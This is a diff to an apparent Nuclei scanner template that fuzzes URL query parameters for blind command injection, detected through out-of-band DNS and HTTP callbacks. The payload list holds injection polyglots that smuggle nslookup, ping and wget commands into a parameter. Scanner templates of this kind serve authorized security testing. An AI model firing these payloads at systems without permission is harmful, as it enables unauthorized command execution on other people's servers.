@@ -2,6 +2,7 @@ http:
 - fuzzing:
   - fuzz:
     - '{{payload}}'
+    mode: single
     part: query
     type: postfix
   matchers:
@@ -9,9 +10,6 @@ http:
     type: word
     words:
     - dns
-  - part: interactsh_protocol
-    type: word
-    words:
     - http
   payloads:
     payload:
@@ -21,8 +19,10 @@ http:
       {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||''"||nslookup({{marker}})||"/*`*/'
     - $(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)
   pre-condition:
-  - dsl:
+  - condition: and
+    dsl:
     - method == "GET"
+    - '!contains(path, ".js")'
     type: dsl
   stop-at-first-match: true
 id: cmdi-blind-oast-polyglot
@@ -39,6 +39,6 @@ info:
   - https://portswigger.net/research/hunting-asynchronous-vulnerabilities
   - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
   severity: high
-  tags: cmdi,oast,dast,blind,polyglot
+  tags: fuzzing-req,fuzzing-req-query,rce,dast,fuzzing-req-rce
 variables:
   marker: '{{interactsh-url}}'
